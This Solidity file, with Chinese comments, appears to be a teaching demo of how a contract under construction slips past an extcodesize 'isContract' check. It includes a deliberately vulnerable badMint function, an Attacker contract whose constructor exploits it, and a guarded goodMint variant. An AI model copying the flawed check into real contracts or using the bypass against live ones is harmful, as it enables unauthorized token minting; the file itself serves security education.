// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// 如果一个地址的 extcodesize > 0，则该地址一定为合约；但如果 extcodesize = 0，该地址既可能为 EOA，也可能为正在创建状态的合约。
// 预防办法

// 你可以使用 (tx.origin == msg.sender) 来检测调用者是否为合约。如果调用者为 EOA，那么tx.origin和msg.sender相等；如果它们俩不相等，调用者为合约。

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract BypassContractCheck is ERC20 {

    constructor() ERC20("" , "") {

    }

    function isContract(address account) private view returns(bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }

        return size > 0;
    }

    function badMint() external {
        require(!isContract(msg.sender), "contract is not allowed");
        _mint(msg.sender, 100);
    }

    function goodMint() external {
        require(msg.sender == tx.origin, "contract is not allowed");
        _mint(msg.sender, 100);
    }
}

contract Attacker {

    BypassContractCheck target;

    constructor(address _target) {
        target = BypassContractCheck(_target);
        for (uint256 i = 0; i < 10; i++) 
        {
            target.badMint();
        }
    }

    function badMint() external {
        target.badMint();
    }
}

contract FailedAttacker {

    BypassContractCheck target;

    constructor(address _target) {
        target = BypassContractCheck(_target);
        for (uint256 i = 0; i < 10; i++) 
        {
            target.goodMint();
        }
    }
}
